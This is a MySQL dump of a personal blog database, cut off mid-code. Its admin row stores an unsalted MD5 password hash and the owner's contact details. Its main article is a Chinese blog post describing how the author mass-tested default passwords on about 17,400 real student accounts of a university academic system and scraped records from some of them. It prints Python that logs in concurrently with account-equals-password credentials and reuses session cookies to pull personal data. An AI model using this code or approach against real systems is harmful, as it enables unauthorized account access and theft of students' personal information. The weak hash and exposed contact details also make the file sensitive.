/*
SQLyog Professional v12.09 (64 bit)
MySQL - 5.7.22 : Database - quanblog
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`quanblog` /*!40100 DEFAULT CHARACTER SET utf8 */;

USE `quanblog`;

/*Table structure for table `admin_user` */

DROP TABLE IF EXISTS `admin_user`;

CREATE TABLE `admin_user` (
  `id` int(12) unsigned NOT NULL AUTO_INCREMENT COMMENT 'PrimaryKey',
  `username` varchar(20) NOT NULL COMMENT '用户名',
  `password` varchar(40) NOT NULL,
  `birth_date` date DEFAULT NULL,
  `nickname` varchar(20) DEFAULT NULL,
  `email` varchar(40) DEFAULT NULL,
  `github` varchar(40) DEFAULT NULL,
  `qq` varchar(15) DEFAULT NULL,
  `wecaht` varchar(20) DEFAULT NULL,
  `hobby` text,
  `motto` text,
  `md_info` text,
  `avatar` varchar(255) DEFAULT NULL COMMENT '头像url',
  `gmt_create` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `gmt_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

/*Data for the table `admin_user` */

insert  into `admin_user`(`id`,`username`,`password`,`birth_date`,`nickname`,`email`,`github`,`qq`,`wecaht`,`hobby`,`motto`,`md_info`,`avatar`,`gmt_create`,`gmt_modified`) values (1,'admin','e10adc3949ba59abbe56e057f20f883e','1996-11-20','摆码王子','zhengbaole_1996@163.com','http://github.com/JamesZBL','1146556298',NULL,'Programming',NULL,NULL,'','2017-12-04 13:07:32','2017-12-04 13:07:32');

/*Table structure for table `article` */

DROP TABLE IF EXISTS `article`;

CREATE TABLE `article` (
  `id` int(12) unsigned NOT NULL AUTO_INCREMENT COMMENT 'PrimaryKey',
  `title` varchar(50) DEFAULT NULL,
  `introduction` text,
  `html_material` text COMMENT '文章 html 内容',
  `md_material` text COMMENT '文章内容',
  `gmt_create` datetime DEFAULT CURRENT_TIMESTAMP,
  `gmt_modified` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8;

/*Data for the table `article` */

insert  into `article`(`id`,`title`,`introduction`,`html_material`,`md_material`,`gmt_create`,`gmt_modified`) values (23,'标题','描述','<div class=\"markdown-body editormd-preview-container\" previewcontainer=\"true\" style=\"padding: 20px;\"><p>内容</p>\r\n</div>','内容','2017-12-09 18:07:40','2018-06-01 14:51:21'),(24,'Python 爬虫获取 URP 教务系统学籍信息','你的个人信息正暴露在互联网中！Python 爬虫获取 URP 教务系统学籍信息','<div class=\"markdown-body editormd-preview-container\" previewcontainer=\"true\" style=\"padding: 20px;\"><h2 id=\"h2-u521Du8877\"><a name=\"初衷\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>初衷</h2><p><strong>本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！</strong></p>\r\n<p>作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，<strong>个人信息泄露情况非常严重！</strong></p>\r\n<h2 id=\"h2-u7ED3u679C\"><a name=\"结果\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>结果</h2><p>先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：</p>\r\n<table>\r\n<thead>\r\n<tr>\r\n<th style=\"text-align:center\">序号</th>\r\n<th style=\"text-align:center\">学院</th>\r\n<th style=\"text-align:center\">年级</th>\r\n<th style=\"text-align:center\">在网账号</th>\r\n<th style=\"text-align:center\">可爬账号</th>\r\n<th style=\"text-align:center\">年级占比</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr>\r\n<td style=\"text-align:center\">1</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2014</td>\r\n<td style=\"text-align:center\">3157</td>\r\n<td style=\"text-align:center\">1998</td>\r\n<td style=\"text-align:center\">63.29%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">2</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2015</td>\r\n<td style=\"text-align:center\">3328</td>\r\n<td style=\"text-align:center\">2234</td>\r\n<td style=\"text-align:center\">67.13%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">3</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2016</td>\r\n<td style=\"text-align:center\">3641</td>\r\n<td style=\"text-align:center\">3066</td>\r\n<td style=\"text-align:center\">84.21%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">4</td>\r\n<td style=\"text-align:center\">本一</td>\r\n<td style=\"text-align:center\">2017</td>\r\n<td style=\"text-align:center\">3497</td>\r\n<td style=\"text-align:center\">3326</td>\r\n<td style=\"text-align:center\">95.11%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">5</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2014</td>\r\n<td style=\"text-align:center\">1759</td>\r\n<td style=\"text-align:center\">303</td>\r\n<td style=\"text-align:center\">17.23%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">6</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2015</td>\r\n<td style=\"text-align:center\">1643</td>\r\n<td style=\"text-align:center\">620</td>\r\n<td style=\"text-align:center\">37.74%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">7</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2016</td>\r\n<td style=\"text-align:center\">1605</td>\r\n<td style=\"text-align:center\">1434</td>\r\n<td style=\"text-align:center\">89.35%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">8</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2017</td>\r\n<td style=\"text-align:center\">1552</td>\r\n<td style=\"text-align:center\">639</td>\r\n<td style=\"text-align:center\">41.17%</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><strong>介于初衷，只爬了 10 个账号的信息，以示严重性！</strong></p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"爬到的学籍信息\"></p>\r\n<h2 id=\"h2-u8FC7u7A0B\"><a name=\"过程\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>过程</h2><p>本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。</p>\r\n<p>Scrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。</p>\r\n<p>这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"系统的登录界面\"></p>\r\n<p>首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"登录请求 ( POST )\"></p>\r\n<p>登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"表单参数\"></p>\r\n<p>服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"登录的响应体\"></p>\r\n<p>刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。</p>\r\n<p>先引入依赖</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">import</span><span class=\"pln\"> sys</span></code></li><li class=\"L1\"><code><span class=\"kwd\">import</span><span class=\"pln\"> logging</span></code></li><li class=\"L2\"><code><span class=\"kwd\">import</span><span class=\"pln\"> gevent</span></code></li><li class=\"L3\"><code><span class=\"kwd\">import</span><span class=\"pln\"> urllib3</span></code></li><li class=\"L4\"><code><span class=\"kwd\">import</span><span class=\"pln\"> pathlib</span></code></li><li class=\"L5\"><code><span class=\"kwd\">from</span><span class=\"pln\"> PIL </span><span class=\"kwd\">import</span><span class=\"pln\"> </span><span class=\"typ\">Image</span></code></li><li class=\"L6\"><code><span class=\"kwd\">from</span><span class=\"pln\"> io </span><span class=\"kwd\">import</span><span class=\"pln\"> </span><span class=\"typ\">BytesIO</span></code></li><li class=\"L7\"><code><span class=\"kwd\">from</span><span class=\"pln\"> lxml </span><span class=\"kwd\">import</span><span class=\"pln\"> etree</span></code></li></ol></pre><p>创建 HTTP 连接池</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"pln\">http </span><span class=\"pun\">=</span><span class=\"pln\"> urllib3</span><span class=\"pun\">.</span><span class=\"typ\">HTTPConnectionPool</span><span class=\"pun\">(</span></code></li><li class=\"L1\"><code><span class=\"pln\">    host</span><span class=\"pun\">=</span><span class=\"pln\">settings</span><span class=\"pun\">.</span><span class=\"pln\">SERVER_HOST</span><span class=\"pun\">,</span></code></li><li class=\"L2\"><code><span class=\"pln\">    port</span><span class=\"pun\">=</span><span class=\"pln\">settings</span><span class=\"pun\">.</span><span class=\"pln\">SERVER_PORT</span><span class=\"pun\">,</span></code></li><li class=\"L3\"><code><span class=\"pln\">    strict</span><span class=\"pun\">=</span><span class=\"kwd\">False</span><span class=\"pun\">,</span></code></li><li class=\"L4\"><code><span class=\"pln\">    maxsize</span><span class=\"pun\">=</span><span class=\"lit\">100</span><span class=\"pun\">,</span></code></li><li class=\"L5\"><code><span class=\"pln\">    block</span><span class=\"pun\">=</span><span class=\"kwd\">False</span><span class=\"pun\">,</span></code></li><li class=\"L6\"><code><span class=\"pln\">    retries</span><span class=\"pun\">=</span><span class=\"lit\">100</span><span class=\"pun\">,</span></code></li><li class=\"L7\"><code><span class=\"pln\">    timeout</span><span class=\"pun\">=</span><span class=\"lit\">10</span></code></li><li class=\"L8\"><code><span class=\"pun\">)</span></code></li></ol></pre><p>请求头的一些固定信息可以预先设定好，伪装浏览器</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"pln\">header </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"str\">\'Accept\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\'</span><span class=\"pun\">,</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"str\">\'Accept-Encoding\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'gzip, deflate\'</span><span class=\"pun\">,</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"str\">\'Accept-Language\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\'</span><span class=\"pun\">,</span></code></li><li class=\"L3\"><code><span class=\"pln\">    </span><span class=\"str\">\'Cache-Control\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'max-age=0\'</span><span class=\"pun\">,</span></code></li><li class=\"L4\"><code><span class=\"pln\">    </span><span class=\"str\">\'Connection\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'Keep-alive\'</span><span class=\"pun\">,</span></code></li><li class=\"L5\"><code><span class=\"pln\">    </span><span class=\"str\">\'Host\'</span><span class=\"pun\">:</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">SERVER_HOST</span><span class=\"pun\">,</span></code></li><li class=\"L6\"><code><span class=\"pln\">    </span><span class=\"str\">\'Upgrade-Insecure-Requests\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'1\'</span><span class=\"pun\">,</span></code></li><li class=\"L7\"><code><span class=\"pln\">    </span><span class=\"str\">\'User-Agent\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\'</span></code></li><li class=\"L8\"><code><span class=\"pun\">}</span></code></li></ol></pre><p>登录并验证是否是初始密码</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"com\"># 账号校验器</span></code></li><li class=\"L1\"><code><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">InfoValidate</span><span class=\"pun\">(</span><span class=\"kwd\">object</span><span class=\"pun\">):</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> __init__</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">):</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">logger</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">http</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 有效账号</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_valid </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[]</span></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"com\"># 可爬账号</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_available </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[]</span></code></li><li class=\"L9\"><code></code></li><li class=\"L0\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> validate</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> all_account</span><span class=\"pun\">):</span></code></li><li class=\"L1\"><code><span class=\"pln\">        </span><span class=\"com\"># 将所有校验过程加入队列</span></code></li><li class=\"L2\"><code><span class=\"pln\">        jobs </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"pln\">gevent</span><span class=\"pun\">.</span><span class=\"pln\">spawn</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">validate_account</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">,</span><span class=\"pln\"> a</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"kwd\">for</span><span class=\"pln\"> a </span><span class=\"kwd\">in</span><span class=\"pln\"> all_account</span><span class=\"pun\">]</span></code></li><li class=\"L3\"><code><span class=\"pln\">        gevent</span><span class=\"pun\">.</span><span class=\"pln\">joinall</span><span class=\"pun\">(</span><span class=\"pln\">jobs</span><span class=\"pun\">,</span><span class=\"pln\"> timeout</span><span class=\"pun\">=</span><span class=\"lit\">0</span><span class=\"pun\">)</span></code></li><li class=\"L4\"><code></code></li><li class=\"L5\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> validate_account</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> http</span><span class=\"pun\">,</span><span class=\"pln\"> account</span><span class=\"pun\">):</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"com\"># 登录请求参数</span></code></li><li class=\"L7\"><code><span class=\"pln\">        param </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"str\">\"zjh\"</span><span class=\"pun\">:</span><span class=\"pln\"> account</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\"mm\"</span><span class=\"pun\">:</span><span class=\"pln\"> account</span><span class=\"pun\">}</span></code></li><li class=\"L8\"><code><span class=\"pln\">        header </span><span class=\"pun\">=</span><span class=\"pln\"> headers</span><span class=\"pun\">.</span><span class=\"pln\">header</span></code></li><li class=\"L9\"><code><span class=\"pln\">        response </span><span class=\"pun\">=</span><span class=\"pln\"> http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'POST\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_LOGIN</span><span class=\"pun\">,</span><span class=\"pln\"> fields</span><span class=\"pun\">=</span><span class=\"pln\">param</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li><li class=\"L0\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"str\">\'发送请求&gt;&gt;{}\'</span><span class=\"pun\">.</span><span class=\"pln\">format</span><span class=\"pun\">(</span><span class=\"pln\">param</span><span class=\"pun\">))</span></code></li><li class=\"L1\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"pln\">response</span><span class=\"pun\">.</span><span class=\"pln\">status</span><span class=\"pun\">)</span></code></li><li class=\"L2\"><code><span class=\"pln\">        </span><span class=\"com\"># 响应体解码</span></code></li><li class=\"L3\"><code><span class=\"pln\">        res_text </span><span class=\"pun\">=</span><span class=\"pln\"> response</span><span class=\"pun\">.</span><span class=\"pln\">data</span><span class=\"pun\">.</span><span class=\"pln\">decode</span><span class=\"pun\">(</span><span class=\"str\">\'GB2312\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'ignore\'</span><span class=\"pun\">)</span></code></li><li class=\"L4\"><code></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> res_text</span><span class=\"pun\">.</span><span class=\"pln\">find</span><span class=\"pun\">(</span><span class=\"str\">\'密码不正确\'</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">&gt;</span><span class=\"pln\"> </span><span class=\"pun\">-</span><span class=\"lit\">1</span><span class=\"pun\">:</span></code></li><li class=\"L6\"><code><span class=\"pln\">            </span><span class=\"com\"># 密码有误</span></code></li><li class=\"L7\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_valid</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">)</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"kwd\">elif</span><span class=\"pln\"> </span><span class=\"kwd\">not</span><span class=\"pln\"> res_text</span><span class=\"pun\">.</span><span class=\"pln\">find</span><span class=\"pun\">(</span><span class=\"str\">\'证件号不存在\'</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">&gt;</span><span class=\"pln\"> </span><span class=\"pun\">-</span><span class=\"lit\">1</span><span class=\"pun\">:</span></code></li><li class=\"L9\"><code><span class=\"pln\">            </span><span class=\"com\"># 账号可爬</span></code></li><li class=\"L0\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_available</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">)</span></code></li><li class=\"L1\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_valid</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">)</span></code></li><li class=\"L2\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"str\">\"账号可用&gt;&gt;&gt;{}\"</span><span class=\"pun\">.</span><span class=\"pln\">format</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">))</span></code></li></ol></pre><p>至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"学籍信息页\"></p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"table 的结构\"></p>\r\n<p>一系列的信息都包裹在 <code>&lt;td width = \"275\"&gt;&lt;/td&gt;</code>之间，对应的 xpath 表达式即为 <code>//td[starts-with(<a href=\"https://github.com/width\" title=\"@width\" class=\"at-link\">@width</a>,\"275\")]/text()</code></p>\r\n<p>基于之前对账号的测试，爬取学籍信息</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"com\"># 信息收集器</span></code></li><li class=\"L1\"><code><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">InfoCollect</span><span class=\"pun\">(</span><span class=\"kwd\">object</span><span class=\"pun\">):</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> __init__</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">):</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">logger</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">http</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 功能模块</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_info </span><span class=\"pun\">=</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">MOD_ROLL_INFO</span></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_img </span><span class=\"pun\">=</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">MOD_ROLL_IMG</span></code></li><li class=\"L8\"><code></code></li><li class=\"L9\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> get_info_queue</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> accounts</span><span class=\"pun\">):</span></code></li><li class=\"L0\"><code><span class=\"pln\">        </span><span class=\"com\"># 将所有信息收集过程加入队列</span></code></li><li class=\"L1\"><code><span class=\"pln\">        jobs </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"pln\">gevent</span><span class=\"pun\">.</span><span class=\"pln\">spawn</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">get_info</span><span class=\"pun\">,</span><span class=\"pln\"> a</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"kwd\">for</span><span class=\"pln\"> a </span><span class=\"kwd\">in</span><span class=\"pln\"> accounts</span><span class=\"pun\">]</span></code></li><li class=\"L2\"><code><span class=\"pln\">        gevent</span><span class=\"pun\">.</span><span class=\"pln\">joinall</span><span class=\"pun\">(</span><span class=\"pln\">jobs</span><span class=\"pun\">,</span><span class=\"pln\"> timeout</span><span class=\"pun\">=</span><span class=\"lit\">0</span><span class=\"pun\">)</span></code></li><li class=\"L3\"><code></code></li><li class=\"L4\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> get_info</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> stuid</span><span class=\"pun\">):</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 登录</span></code></li><li class=\"L6\"><code><span class=\"pln\">        param </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"str\">\'zjh\'</span><span class=\"pun\">:</span><span class=\"pln\"> stuid</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'mm\'</span><span class=\"pun\">:</span><span class=\"pln\"> stuid</span><span class=\"pun\">}</span></code></li><li class=\"L7\"><code><span class=\"pln\">        response </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'POST\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_LOGIN</span><span class=\"pun\">,</span><span class=\"pln\"> fields</span><span class=\"pun\">=</span><span class=\"pln\">param</span><span class=\"pun\">)</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"com\"># 保存 Cookie</span></code></li><li class=\"L9\"><code><span class=\"pln\">        cookie </span><span class=\"pun\">=</span><span class=\"pln\"> response</span><span class=\"pun\">.</span><span class=\"pln\">headers</span><span class=\"pun\">[</span><span class=\"str\">\'Set-Cookie\'</span><span class=\"pun\">].</span><span class=\"pln\">replace</span><span class=\"pun\">(</span><span class=\"str\">\'; path=/\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'\'</span><span class=\"pun\">)</span></code></li><li class=\"L0\"><code><span class=\"pln\">        header </span><span class=\"pun\">=</span><span class=\"pln\"> headers</span><span class=\"pun\">.</span><span class=\"pln\">header</span></code></li><li class=\"L1\"><code><span class=\"pln\">        header</span><span class=\"pun\">[</span><span class=\"str\">\'cookie\'</span><span class=\"pun\">]</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\"> cookie</span></code></li><li class=\"L2\"><code><span class=\"pln\">        </span><span class=\"com\"># 学籍信息</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_info</span><span class=\"pun\">:</span></code></li><li class=\"L4\"><code><span class=\"pln\">            </span><span class=\"com\"># 带 Cookie 访问学籍信息页</span></code></li><li class=\"L5\"><code><span class=\"pln\">            response_xjxx </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span 